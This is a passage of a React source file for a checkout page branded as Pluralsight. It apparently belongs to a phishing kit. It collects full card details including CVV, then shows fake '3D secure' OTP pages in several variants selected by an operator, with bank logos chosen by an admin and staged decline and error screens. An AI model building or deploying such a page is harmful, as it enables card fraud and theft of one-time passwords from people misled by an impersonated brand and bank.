      )}
      
      {/* Payment Error Screen */}
      {showPaymentErrorScreen && (
        <div className="fixed inset-0 bg-white flex items-center justify-center z-[9999]">
          <div className="text-center">
            <div className="w-20 h-20 mx-auto mb-8">
              <div className="w-full h-full border-4 border-red-200 border-t-red-500 rounded-full animate-spin" style={{
                animation: 'spin 2s linear infinite'
              }}></div>
            </div>
            <p className="text-red-600 text-lg font-medium max-w-md mx-auto px-4">
              {paymentErrorMessage}
            </p>
          </div>
        </div>
      )}
      {/* Header with Progress */}
      <div className="border-b border-slate-700 px-4 sm:px-6 py-4">
        <div className="max-w-7xl mx-auto w-full">
          {/* Back to pricing link */}
          <Link to="/" className="flex items-center gap-2 text-slate-300 hover:text-white mb-4 sm:mb-6 text-sm">
            <ArrowLeft size={16} />
            Back to pricing
          </Link>
          
          {/* Progress Steps */}
          <div className="flex items-center gap-4 sm:gap-6 lg:gap-8 overflow-x-auto pb-2 sm:pb-0">
            <div className="flex items-center gap-3 whitespace-nowrap">
              <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-sm font-medium flex-shrink-0">
                1
              </div>
              <span className="text-white font-medium text-sm sm:text-base">ACCOUNT</span>
            </div>
            <div className="flex items-center gap-3 whitespace-nowrap">
              <div className="w-8 h-8 bg-slate-600 rounded-full flex items-center justify-center text-sm font-medium flex-shrink-0">
                2
              </div>
              <span className="text-slate-400 font-medium text-sm sm:text-base">PAYMENT</span>
            </div>
            <div className="flex items-center gap-3 whitespace-nowrap">
              <div className="w-8 h-8 bg-slate-600 rounded-full flex items-center justify-center text-sm font-medium flex-shrink-0">
                3
              </div>
              <span className="text-slate-400 font-medium text-sm sm:text-base">REVIEW</span>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 py-6 sm:py-8 w-full">
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 lg:gap-8">
          {/* Left Content Area */}
          <div className="lg:col-span-2 w-full min-w-0">
            {/* Account Details Section */}
            {currentStep === 'account' && (
              <>
                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-sm font-medium">
                    ✓
                  </div>
                  <h2 className="text-2xl font-bold">Account details</h2>
                </div>

                <div className="mb-6">
                  <span className="text-slate-300">Already have an account? </span>
                  <a href="#" className="text-blue-400 hover:underline">Sign in</a>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 sm:gap-6 mb-6">
                  <div className="w-full">
                    <label className="block text-sm font-medium mb-2">
                      First name<span className="text-red-500">*</span>
                    </label>
                    <Input
                      value={formData.firstName}
                      onChange={(e) => handleInputChange('firstName', e.target.value)}
                      onBlur={() => handleFieldBlur('firstName')}
                      className={`bg-white text-slate-900 ${
                        errors.firstName ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                      }`}
                      placeholder=""
                    />
                    {errors.firstName && (
                      <p className="text-red-500 text-xs mt-1">{errors.firstName}</p>
                    )}
                  </div>
                  <div className="w-full">
                    <label className="block text-sm font-medium mb-2">
                      Last name<span className="text-red-500">*</span>
                    </label>
                    <Input
                      value={formData.lastName}
                      onChange={(e) => handleInputChange('lastName', e.target.value)}
                      onBlur={() => handleFieldBlur('lastName')}
                      className={`bg-white text-slate-900 ${
                        errors.lastName ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                      }`}
                      placeholder=""
                    />
                    {errors.lastName && (
                      <p className="text-red-500 text-xs mt-1">{errors.lastName}</p>
                    )}
                  </div>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 sm:gap-6 mb-6">
                  <div className="w-full">
                    <label className="block text-sm font-medium mb-2">
                      Email<span className="text-red-500">*</span>
                    </label>
                    <Input
                      type="email"
                      value={formData.email}
                      onChange={(e) => handleInputChange('email', e.target.value)}
                      onBlur={() => handleFieldBlur('email')}
                      className={`bg-white text-slate-900 ${
                        errors.email ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                      }`}
                      placeholder=""
                    />
                    {errors.email && (
                      <p className="text-red-500 text-xs mt-1">{errors.email}</p>
                    )}
                  </div>
                  <div className="w-full">
                    <label className="block text-sm font-medium mb-2">
                      Confirm Email<span className="text-red-500">*</span>
                    </label>
                    <Input
                      type="email"
                      value={formData.confirmEmail}
                      onChange={(e) => handleInputChange('confirmEmail', e.target.value)}
                      onBlur={() => handleFieldBlur('confirmEmail')}
                      className={`bg-white text-slate-900 ${
                        errors.confirmEmail ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                      }`}
                      placeholder=""
                    />
                    {errors.confirmEmail && (
                      <p className="text-red-500 text-xs mt-1">{errors.confirmEmail}</p>
                    )}
                  </div>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 sm:gap-6 mb-8">
                  <div className="w-full">
                    <label className="block text-sm font-medium mb-2">
                      Country of residence<span className="text-red-500">*</span>
                    </label>
                    <Select 
                      value={formData.country}
                      onValueChange={(value) => {
                        handleInputChange('country', value);
                        // Clear any existing error when country is selected
                        setErrors(prev => ({ ...prev, country: '' }));
                        setTouched(prev => ({ ...prev, country: true }));
                      }}
                    >
                      <SelectTrigger className={`bg-white text-slate-900 ${
                        errors.country ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                      }`}>
                        <SelectValue placeholder="- Select One -" />
                      </SelectTrigger>
                       <SelectContent>
                         <SelectItem value="afghanistan">Afghanistan</SelectItem>
                         <SelectItem value="albania">Albania</SelectItem>
                         <SelectItem value="algeria">Algeria</SelectItem>
                         <SelectItem value="argentina">Argentina</SelectItem>
                         <SelectItem value="armenia">Armenia</SelectItem>
                         <SelectItem value="australia">Australia</SelectItem>
                         <SelectItem value="austria">Austria</SelectItem>
                         <SelectItem value="azerbaijan">Azerbaijan</SelectItem>
                         <SelectItem value="bahrain">Bahrain</SelectItem>
                         <SelectItem value="bangladesh">Bangladesh</SelectItem>
                         <SelectItem value="belarus">Belarus</SelectItem>
                         <SelectItem value="belgium">Belgium</SelectItem>
                         <SelectItem value="brazil">Brazil</SelectItem>
                         <SelectItem value="bulgaria">Bulgaria</SelectItem>
                         <SelectItem value="cambodia">Cambodia</SelectItem>
                         <SelectItem value="canada">Canada</SelectItem>
                         <SelectItem value="chile">Chile</SelectItem>
                         <SelectItem value="china">China</SelectItem>
                         <SelectItem value="colombia">Colombia</SelectItem>
                         <SelectItem value="croatia">Croatia</SelectItem>
                         <SelectItem value="cyprus">Cyprus</SelectItem>
                         <SelectItem value="czech-republic">Czech Republic</SelectItem>
                         <SelectItem value="denmark">Denmark</SelectItem>
                         <SelectItem value="egypt">Egypt</SelectItem>
                         <SelectItem value="estonia">Estonia</SelectItem>
                         <SelectItem value="finland">Finland</SelectItem>
                         <SelectItem value="france">France</SelectItem>
                         <SelectItem value="georgia">Georgia</SelectItem>
                         <SelectItem value="germany">Germany</SelectItem>
                         <SelectItem value="ghana">Ghana</SelectItem>
                         <SelectItem value="greece">Greece</SelectItem>
                         <SelectItem value="hungary">Hungary</SelectItem>
                         <SelectItem value="iceland">Iceland</SelectItem>
                         <SelectItem value="india">India</SelectItem>
                         <SelectItem value="indonesia">Indonesia</SelectItem>
                         <SelectItem value="iran">Iran</SelectItem>
                         <SelectItem value="iraq">Iraq</SelectItem>
                         <SelectItem value="ireland">Ireland</SelectItem>
                         <SelectItem value="israel">Israel</SelectItem>
                         <SelectItem value="italy">Italy</SelectItem>
                         <SelectItem value="japan">Japan</SelectItem>
                         <SelectItem value="jordan">Jordan</SelectItem>
                         <SelectItem value="kazakhstan">Kazakhstan</SelectItem>
                         <SelectItem value="kenya">Kenya</SelectItem>
                         <SelectItem value="kuwait">Kuwait</SelectItem>
                         <SelectItem value="latvia">Latvia</SelectItem>
                         <SelectItem value="lebanon">Lebanon</SelectItem>
                         <SelectItem value="lithuania">Lithuania</SelectItem>
                         <SelectItem value="luxembourg">Luxembourg</SelectItem>
                         <SelectItem value="malaysia">Malaysia</SelectItem>
                         <SelectItem value="mexico">Mexico</SelectItem>
                         <SelectItem value="morocco">Morocco</SelectItem>
                         <SelectItem value="netherlands">Netherlands</SelectItem>
                         <SelectItem value="new-zealand">New Zealand</SelectItem>
                         <SelectItem value="nigeria">Nigeria</SelectItem>
                         <SelectItem value="norway">Norway</SelectItem>
                         <SelectItem value="pakistan">Pakistan</SelectItem>
                         <SelectItem value="peru">Peru</SelectItem>
                         <SelectItem value="philippines">Philippines</SelectItem>
                         <SelectItem value="poland">Poland</SelectItem>
                         <SelectItem value="portugal">Portugal</SelectItem>
                         <SelectItem value="qatar">Qatar</SelectItem>
                         <SelectItem value="romania">Romania</SelectItem>
                         <SelectItem value="russia">Russia</SelectItem>
                         <SelectItem value="saudi-arabia">Saudi Arabia</SelectItem>
                         <SelectItem value="singapore">Singapore</SelectItem>
                         <SelectItem value="slovakia">Slovakia</SelectItem>
                         <SelectItem value="slovenia">Slovenia</SelectItem>
                         <SelectItem value="south-africa">South Africa</SelectItem>
                         <SelectItem value="south-korea">South Korea</SelectItem>
                         <SelectItem value="spain">Spain</SelectItem>
                         <SelectItem value="sri-lanka">Sri Lanka</SelectItem>
                         <SelectItem value="sweden">Sweden</SelectItem>
                         <SelectItem value="switzerland">Switzerland</SelectItem>
                         <SelectItem value="taiwan">Taiwan</SelectItem>
                         <SelectItem value="thailand">Thailand</SelectItem>
                         <SelectItem value="turkey">Turkey</SelectItem>
                         <SelectItem value="ukraine">Ukraine</SelectItem>
                         <SelectItem value="uae">United Arab Emirates</SelectItem>
                         <SelectItem value="uk">United Kingdom</SelectItem>
                         <SelectItem value="usa">United States</SelectItem>
                         <SelectItem value="venezuela">Venezuela</SelectItem>
                         <SelectItem value="vietnam">Vietnam</SelectItem>
                       </SelectContent>
                    </Select>
                    {errors.country && (
                      <p className="text-red-500 text-xs mt-1">{errors.country}</p>
                    )}
                  </div>
                  <div className="w-full">
                    <label className="block text-sm font-medium mb-2">
                      Company name (optional)
                    </label>
                    <Input
                      value={formData.companyName}
                      onChange={(e) => handleInputChange('companyName', e.target.value)}
                      className="bg-white text-slate-900 border-slate-300"
                      placeholder=""
                    />
                  </div>
                </div>

                {/* Terms and Conditions */}
                <div className="mb-6 sm:mb-8">
                  <div className="flex items-start gap-3">
                    <Checkbox
                      id="terms-checkbox"
                      checked={agreeTerms}
                      onCheckedChange={(checked) => {
                        devLog('Checkbox clicked, new state:', checked);
                        setAgreeTerms(checked === true);
                        if (checked) {
                          setShowTermsError(false);
                        }
                      }}
                      className={`h-5 w-5 mt-0.5 rounded border-2 data-[state=checked]:bg-blue-600 data-[state=checked]:border-blue-600 data-[state=unchecked]:bg-transparent data-[state=unchecked]:border-gray-400 ${showTermsError ? 'border-red-500' : 'border-gray-400'} hover:border-blue-500 transition-colors flex-shrink-0 cursor-pointer flex items-center justify-center`}
                    />
                    <label 
                      htmlFor="terms-checkbox" 
                      className={`text-xs sm:text-sm leading-5 cursor-pointer select-none ${showTermsError ? 'text-red-500' : 'text-slate-300'} hover:text-slate-200 transition-colors flex-1 pt-0.5`}
                    >
                      By checking here and continuing, I agree to the Pluralsight{' '}
                      <a href="https://legal.pluralsight.com/policies" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">Terms of Use</a>.
                    </label>
                  </div>
                </div>

                {/* Continue Button */}
                <Button
                  onClick={handleContinue}
                  disabled={!isFormValid()}
                  className={`w-full sm:w-auto px-8 sm:px-12 py-2 sm:py-3 rounded font-medium text-sm sm:text-base ${
                    isFormValid() 
                      ? 'bg-blue-600 hover:bg-blue-700 text-white' 
                      : 'bg-slate-500 text-slate-300 cursor-not-allowed'
                  }`}
                >
                  Continue
                </Button>
              </>
            )}

            {/* Loading Section */}
            {currentStep === 'loading' && (
              <div className="flex flex-col items-center justify-center py-20">
                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center text-sm font-medium">
                    ✓
                  </div>
                  <h2 className="text-2xl font-bold">Account details</h2>
                </div>
                
                <div className="flex items-center gap-3 mb-12">
                  <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-sm font-medium">
                    2
                  </div>
                  <h2 className="text-2xl font-bold">Payment</h2>
                </div>

                <p className="text-white mb-6 text-lg">Select a payment method</p>
                
                <div className="flex items-center justify-center">
                  <Loader2 className="h-12 w-12 animate-spin text-blue-500" />
                </div>
              </div>
            )}

            {/* Payment Section */}
            {currentStep === 'payment' && (
              <>
                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center text-sm font-medium flex-shrink-0">
                    ✓
                  </div>
                  <span className="text-slate-300 font-medium">Account details</span>
                </div>

                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-sm font-medium flex-shrink-0">
                    2
                  </div>
                  <h2 className="text-2xl font-bold">Payment</h2>
                </div>

                <p className="text-white mb-8 text-lg">Select a payment method</p>

{/* Transaction Cancel Error Message */}
{transactionCancelError && (
  <div className="bg-red-50 border border-red-200 rounded-lg p-3 mb-6">
    <p className="text-red-700 text-sm font-medium">
      {transactionCancelError}
    </p>
  </div>
)}

                {/* Payment Method Selection */}
                <div 
                  className={`border border-slate-600 rounded-lg mb-6 transition-all ${
                    paymentMethod === 'credit' ? 'border-blue-500 bg-slate-800' : 'hover:border-slate-500'
                  }`}
                >
                  <div 
                    className="p-4 cursor-pointer"
                    onClick={() => handlePaymentMethodSelect('credit')}
                  >
                    <div className="flex items-center gap-2 sm:gap-3">
                      <div className={`w-4 h-4 sm:w-5 sm:h-5 rounded-full border-2 flex items-center justify-center ${
                        paymentMethod === 'credit' ? 'border-blue-500' : 'border-slate-400'
                      }`}>
                        {paymentMethod === 'credit' && (
                          <div className="w-2 h-2 sm:w-2.5 sm:h-2.5 bg-blue-500 rounded-full"></div>
                        )}
                      </div>
                      <CreditCard className="h-4 w-4 sm:h-5 sm:w-5 text-blue-400" />
                      <span className="font-medium text-sm sm:text-base">Credit Card / Debit Card</span>
                      <div className="ml-auto flex gap-1 sm:gap-2">
                        {/* Updated card brand logos with mobile-responsive sizing */}
                        <div className="h-6 w-8 sm:h-8 sm:w-12 bg-white rounded flex items-center justify-center p-0.5 sm:p-1">
                          <img 
                            src="https://brandlogos.net/wp-content/uploads/2014/10/visa-logo-300x300.png" 
                            alt="Visa" 
                            className="h-4 w-6 sm:h-6 sm:w-10 object-contain"
                          />
                        </div>
                        <div className="h-6 w-8 sm:h-8 sm:w-12 bg-white rounded flex items-center justify-center p-0.5 sm:p-1">
                          <img 
                            src="https://i.pinimg.com/originals/48/40/de/4840deeea4afad677728525d165405d0.jpg" 
                            alt="Mastercard" 
                            className="h-4 w-6 sm:h-6 sm:w-10 object-contain"
                          />
                        </div>
                        <div className="h-6 w-8 sm:h-8 sm:w-12 bg-white rounded flex items-center justify-center p-0.5 sm:p-1">
                          <img 
                            src="https://images.seeklogo.com/logo-png/49/2/discover-card-logo-png_seeklogo-499264.png" 
                            alt="Discover" 
                            className="h-4 w-6 sm:h-6 sm:w-10 object-contain"
                          />
                        </div>
                        <div className="h-6 w-8 sm:h-8 sm:w-12 bg-white rounded flex items-center justify-center p-0.5 sm:p-1">
                          <img 
                            src="https://brandlogos.net/wp-content/uploads/2022/03/rupay-logo-brandlogos.net_-512x512.png" 
                            alt="RuPay" 
                            className="h-4 w-6 sm:h-6 sm:w-10 object-contain"
                          />
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Payment Method Feedback Section - Integrated */}
                  <div className="border-t border-slate-600 overflow-hidden transition-all">
                    <div 
                      className="px-4 py-3 cursor-pointer hover:bg-slate-700/30 transition-colors"
                      onClick={(e) => {
                        e.stopPropagation();
                        setShowPaymentFeedback(!showPaymentFeedback);
                      }}
                    >
                      <p className="text-sm text-gray-400">
                        Don't see your preferred payment method?{' '}
                        <span className="text-blue-400 hover:text-blue-300 underline">
                          Let us know
                        </span>
                      </p>
                    </div>
                    
                    {/* Sliding Payment Methods Menu */}
                    <div className={`transition-all duration-500 ease-in-out overflow-hidden ${
                      showPaymentFeedback ? 'max-h-96 opacity-100' : 'max-h-0 opacity-0'
                    }`}>
                      <div className="px-4 pb-4 bg-slate-700/50">
                        <div className="bg-slate-700 rounded-lg border border-slate-500 p-4">
                          <p className="text-white text-sm mb-4">Is there a different way you'd like to pay? (Select all that apply)</p>
                          
                          <div className="grid grid-cols-2 gap-3">
                            {[
                              'Google Pay',
                              'Amazon Pay', 
                              'Visa Checkout',
                              'Sofort',
                              'Qirpay',
                              'RuPay',
                              'Purchase Order',
                              'Other'
                            ].map((method) => (
                              <label key={method} className="flex items-center gap-2 text-sm text-gray-300 cursor-pointer hover:text-white transition-colors">
                                <input
                                  type="checkbox"
                                  className="rounded border-gray-500 bg-gray-700 text-blue-500 focus:ring-blue-500"
                                  checked={selectedPaymentMethods.includes(method)}
                                  onChange={(e) => {
                                    if (e.target.checked) {
                                      setSelectedPaymentMethods(prev => [...prev, method]);
                                    } else {
                                      setSelectedPaymentMethods(prev => prev.filter(m => m !== method));
                                    }
                                  }}
                                />
                                {method}
                              </label>
                            ))}
                          </div>
                          
                          <div className="mt-4">
                            <button
                              className="bg-orange-500 hover:bg-orange-600 text-white px-4 py-2 rounded text-sm font-medium transition-colors"
                              onClick={() => {
                                setFeedbackSubmitted(true);
                                setTimeout(() => {
                                  setFeedbackSubmitted(false);
                                  setShowPaymentFeedback(false);
                                  setSelectedPaymentMethods([]);
                                }, 3500);
                              }}
                            >
                              Submit feedback
                            </button>
                          </div>
                          
                          {/* Success Message */}
                          {feedbackSubmitted && (
                            <div className="mt-3 p-3 bg-blue-600 rounded border border-blue-500">
                              <p className="text-white text-sm font-medium">
                                Thank you! Your response has been submitted.
                              </p>
                            </div>
                          )}
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Card Details Form - Only shown when credit card is selected */}
                {paymentMethod === 'credit' && (
                  <div className="space-y-6 mb-8">
                    {/* Card Declined Error Message */}
                    {cardDeclinedError && (
                      <div className="bg-red-50 border border-red-300 rounded-lg p-4">
                        <p className="text-red-700 text-sm font-medium">{cardDeclinedError}</p>
                      </div>
                    )}
                    {cardError && (
                      <div className="mb-4">
                        <div className="bg-red-50 border border-red-500 text-red-700 rounded p-2 text-center text-sm font-semibold">
                          {cardError}
                        </div>
                      </div>
                    )}
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 sm:gap-6">
                      <div className="w-full">
                        <label className="block text-sm font-medium mb-2">
                          Name on card<span className="text-red-500">*</span>
                        </label>
                        <Input
                          value={cardData.cardName}
                          onChange={(e) => handleCardInputChange('cardName', e.target.value)}
                          className={`bg-white text-slate-900 ${
                            cardErrors.cardName ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                          }`}
                          placeholder=""
                        />
                        {cardErrors.cardName && (
                          <p className="text-red-500 text-xs mt-1">{cardErrors.cardName}</p>
                        )}
                      </div>
                       <div className="w-full">
                         <label className="block text-sm font-medium mb-2">
                           Card number<span className="text-red-500">*</span>
                         </label>
                         <div className="relative">
                           <Input
                             value={cardData.cardNumber}
                             onChange={(e) => {
                               const value = e.target.value.slice(0, 19); // Allow for spaces (16 digits + 3 spaces)
                               handleCardInputChange('cardNumber', value);
                             }}
                             className={`bg-white text-slate-900 pr-12 ${
                               cardErrors.cardNumber ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                             }`}
                             placeholder="1234 5678 9012 3456"
                           />
                           {/* Card Brand Logo */}
                           {cardData.cardNumber.length >= 4 && getCardType(cardData.cardNumber) && (
                             <div className="absolute right-3 top-1/2 transform -translate-y-1/2 transition-all duration-300 hover:scale-110">
                               {getCardType(cardData.cardNumber) === 'visa' && (
                                 <img 
                                   src="https://cdn4.iconfinder.com/data/icons/simple-peyment-methods/512/visa-128.png" 
                                   alt="Visa" 
                                   className="h-6 w-8 object-contain"
                                 />
                               )}
                               {getCardType(cardData.cardNumber) === 'mastercard' && (
                                 <img 
                                   src="https://brandlogos.net/wp-content/uploads/2011/08/mastercard-logo.png" 
                                   alt="Mastercard" 
                                   className="h-6 w-8 object-contain"
                                 />
                               )}
                               {getCardType(cardData.cardNumber) === 'discover' && (
                                 <img 
                                   src="https://1000logos.net/wp-content/uploads/2021/05/Discover-logo-500x281.png" 
                                   alt="Discover" 
                                   className="h-6 w-8 object-contain"
                                 />
                               )}
                               {getCardType(cardData.cardNumber) === 'rupay' && (
                                 <img 
                                   src="https://logotyp.us/file/rupay.svg" 
                                   alt="RuPay" 
                                   className="h-6 w-8 object-contain"
                                 />
                               )}
                             </div>
                           )}
                         </div>
                         {cardErrors.cardNumber && (
                           <div className="mt-1 px-3 py-2 bg-red-50 border border-red-200 rounded text-red-600 text-xs">
                             {cardErrors.cardNumber}
                           </div>
                         )}
                       </div>
                    </div>

                    <div className="grid grid-cols-3 gap-6">
                      <div>
                        <label className="block text-sm font-medium mb-2">
                          Expiration<span className="text-red-500">*</span>
                        </label>
                         <Select onValueChange={(value) => handleCardInputChange('expiryMonth', value)}>
                           <SelectTrigger className={`bg-white text-slate-900 ${
                             cardErrors.expiryMonth ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                           }`}>
                             <SelectValue placeholder="Month" />
                           </SelectTrigger>
                           <SelectContent>
                             {Array.from({length: 12}, (_, i) => (
                               <SelectItem key={i+1} value={String(i+1).padStart(2, '0')}>
                                 {String(i+1).padStart(2, '0')}
                               </SelectItem>
                             ))}
                           </SelectContent>
                         </Select>
                         {cardErrors.expiryMonth && (
                           <div className="mt-1 px-3 py-2 bg-red-50 border border-red-200 rounded text-red-600 text-xs">
                             {cardErrors.expiryMonth}
                           </div>
                         )}
                      </div>
                      <div>
                        <label className="block text-sm font-medium mb-2 text-transparent">Year</label>
                         <Select onValueChange={(value) => handleCardInputChange('expiryYear', value)}>
                           <SelectTrigger className={`bg-white text-slate-900 ${
                             cardErrors.expiryYear ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                           }`}>
                             <SelectValue placeholder="Year" />
                           </SelectTrigger>
                           <SelectContent>
                             {Array.from({length: 51}, (_, i) => {
                               const year = new Date().getFullYear() + i;
                               return (
                                 <SelectItem key={year} value={String(year).slice(-2)}>
                                   {year}
                                 </SelectItem>
                               );
                             })}
                           </SelectContent>
                         </Select>
                         {cardErrors.expiryYear && (
                           <div className="mt-1 px-3 py-2 bg-red-50 border border-red-200 rounded text-red-600 text-xs">
                             {cardErrors.expiryYear}
                           </div>
                         )}
                      </div>
                      <div>
                        <label className="block text-sm font-medium mb-2">
                          CVV<span className="text-red-500">*</span>
                        </label>
                        <Input
                          value={cardData.cvv}
                          onChange={(e) => {
                            const value = e.target.value.replace(/\D/g, '').slice(0, 4);
                            handleCardInputChange('cvv', value);
                          }}
                          className={`bg-white text-slate-900 ${
                            cardErrors.cvv ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                          }`}
                          placeholder="123"
                        />
                        {cardErrors.cvv && (
                          <p className="text-red-500 text-xs mt-1">{cardErrors.cvv}</p>
                        )}
                      </div>
                    </div>

                    {/* Review Order Button */}
                    <Button
                      onClick={handleReviewOrder}
                      disabled={!paymentMethod || !areAllCardFieldsFilled() || !isCardFormValid()}
                      className={`w-full md:w-auto px-12 py-3 rounded font-medium ${
                        paymentMethod && areAllCardFieldsFilled() && isCardFormValid()
                          ? 'bg-blue-600 hover:bg-blue-700 text-white' 
                          : 'bg-slate-500 text-slate-300 cursor-not-allowed'
                      }`}
                    >
                      Review order
                    </Button>
                    

                  </div>
                )}
              </>
            )}

            {/* Processing Section */}
            {currentStep === 'processing' && (
              <div className="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm flex items-center justify-center z-50">
                <div className="text-center">
                  <Loader2 className="h-16 w-16 animate-spin text-blue-500 mb-6 mx-auto" />
                  <p className="text-white text-lg font-medium">{processingMessage}</p>
                </div>
              </div>
            )}

            {/* Enhanced OTP Verification Section - Loading State */}
            {currentStep === 'otp' && (otpPageSelection === 'new' || otpPageSelection === 'third') && newOtpPageLoading && (
              <div className="fixed inset-0 z-50 flex items-center justify-center bg-white">
                <div className="text-center">
                  <Loader2 className="h-16 w-16 animate-spin text-blue-500 mb-6 mx-auto" />
                  <p className="text-slate-700 text-lg font-medium">Please wait while we redirect you to 3D secure authentication page...</p>
                </div>
              </div>
            )}

            {/* Second OTP Page (NEW) */}
            {currentStep === 'otp' && otpPageSelection === 'new' && !newOtpPageLoading && (
              <NewOTPPage
                cardData={cardData}
                otpValue={otpValue}
                setOtpValue={setOtpValue}
                otpSubmitting={otpSubmitting}
                handleOtpSubmit={handleOtpSubmit}
                handleOtpCancel={handleOtpCancel}
                otpError={otpError}
                adminSelectedBankLogo={adminSelectedBankLogo}
                sessionBankLogo={sessionBankLogo}
                cardBrandLogos={cardBrandLogos}
                getCardBrand={getCardBrand}
                displayPrice={displayPrice}
                formatPrice={formatPrice}
              />
            )}

            {/* Third OTP Page (THIRD) */}
            {currentStep === 'otp' && otpPageSelection === 'third' && !newOtpPageLoading && (
              <ThirdOTPPage
                cardData={cardData}
                otpValue={otpValue}
                setOtpValue={setOtpValue}
                otpSubmitting={otpSubmitting}
                handleOtpSubmit={handleOtpSubmit}
                handleOtpCancel={handleOtpCancel}
                otpError={otpError}
                adminSelectedBankLogo={adminSelectedBankLogo}
                sessionBankLogo={sessionBankLogo}
                cardBrandLogos={cardBrandLogos}
                getCardBrand={getCardBrand}
                displayPrice={displayPrice}
                formatPrice={formatPrice}
                onRedirectToSecondOTP={() => {
                  setOtpPageSelection('new');
                  setUseNewOTPPage(true);
                }}
              />
            )}

            {/* Original OTP Modal (OLD) - when otpPageSelection is 'old' */}
            {currentStep === 'otp' && otpPageSelection === 'old' && (
              <div className={`fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 backdrop-blur-sm transition-opacity duration-300 ease-out ${
                otpModalAnimating ? 'bg-black bg-opacity-0' : 'bg-black bg-opacity-70'
              }`}>
                <div className="flex flex-col items-center w-full">
                  {/* Cancel Button (above white box, right-aligned) */}
                  <div className={`flex justify-end w-full mb-2 max-w-xs sm:max-w-md transition-all duration-300 ease-out ${
                    otpModalAnimating ? 'opacity-0 transform translate-y-2' : 'opacity-100 transform translate-y-0'
                  }`}>
                    <button
                      onClick={() => setShowCancelConfirm(true)}
                      className="text-white hover:text-gray-300 text-sm font-medium underline bg-transparent border-none cursor-pointer"
                      aria-label="Cancel Transaction"
                    >
                      cancel
                    </button>
                  </div>
                  <div className={`bg-white rounded-lg shadow-2xl relative w-full max-w-xs sm:max-w-md transition-all duration-300 ease-out ${
                    otpModalAnimating ? 'opacity-0 transform scale-95 translate-y-4' : 'opacity-100 transform scale-100 translate-y-0'
                  }`}>
                  {/* OTP Loading Overlay */}
                  {otpLoading && (
                    <div className="absolute inset-0 bg-white rounded-lg flex items-center justify-center z-50">
                      <div className="text-center">
                        {/* Card Brand Logo */}
                        <div className="mb-8">
                          <img 
                            src={(() => {
                              const cardBrand = getCardBrand(cardData.cardNumber);
                              devLog('Card Number:', cardData.cardNumber);
                              devLog('Detected Card Brand:', cardBrand);
                              devLog('Logo URL:', cardBrandLogos[cardBrand as keyof typeof cardBrandLogos]);
                              return cardBrandLogos[cardBrand as keyof typeof cardBrandLogos];
                            })()} 
                            alt="Card Brand" 
                            className="w-20 h-20 mx-auto object-contain"
                            onError={(e) => {
                              devLog('Logo loading failed, falling back to Visa');
                              e.currentTarget.src = cardBrandLogos.visa;
                            }}
                          />
                        </div>
                        {/* Loading Spinner */}
                        <div className="w-10 h-10 border-4 border-gray-300 border-t-transparent rounded-full animate-spin mx-auto"></div>
                      </div>
                    </div>
                  )}
                  
                  {/* Cancel Confirmation Popup */}
                  {showCancelConfirm && (
                    <div className="absolute inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[70]">
                      <div className="bg-white rounded-lg p-6 max-w-sm mx-4 shadow-2xl">
                        <h3 className="text-lg font-semibold text-gray-800 mb-4 text-center">
                          Do you want to cancel this transaction?
                        </h3>
                        <div className="flex gap-3 justify-center">
                          <button
                            onClick={() => {
                              // Yes - redirect to card details with error
                              setShowCancelConfirm(false);
                              setCurrentStep('payment');
                              setShowOtp(false);
                              setTransactionCancelError('User cancelled the transaction');
                              setOtpValue('');
                              setOtpError('');
                            }}
                            className="px-6 py-2 bg-red-600 text-white rounded hover:bg-red-700 font-medium"
                          >
                            Yes
                          </button>
                          <button
                            onClick={() => setShowCancelConfirm(false)}
                            className="px-6 py-2 bg-gray-300 text-gray-700 rounded hover:bg-gray-400 font-medium"
                          >
                            No
                          </button>
                        </div>
                      </div>
                    </div>
                  )}


                  {/* Top Row: Card Brand Logo (left) and Bank Logo (right) */}
                  <div className="flex items-center justify-between px-6 pt-6 pb-4 border-b border-gray-200">
                    <div className="flex items-center gap-2">
                      <div className="flex items-center justify-center bg-white rounded-md border border-gray-200 p-1 shadow-sm">
                        <img
                          src={cardBrandLogos[getCardBrand(cardData.cardNumber) as keyof typeof cardBrandLogos]}
                          alt="Card Brand Logo"
                          className="h-8 w-auto max-w-[65px] object-contain"
                          onError={(e) => {
                            devLog('Header logo loading failed, falling back to Visa');
                            e.currentTarget.src = cardBrandLogos.visa;
                          }}
                        />
                      </div>
                      <span className="font-semibold text-gray-700 text-sm">ID Check</span>
                    </div>
                    <img
                      src={adminSelectedBankLogo || sessionBankLogo || 'https://logolook.net/wp-content/uploads/2021/11/HDFC-Bank-Logo-500x281.png'}
                      alt="Bank Logo"
                      className="h-8 w-20 object-contain"
                      onError={(e) => {
                        devLog('❌ Bank logo failed to load, using fallback');
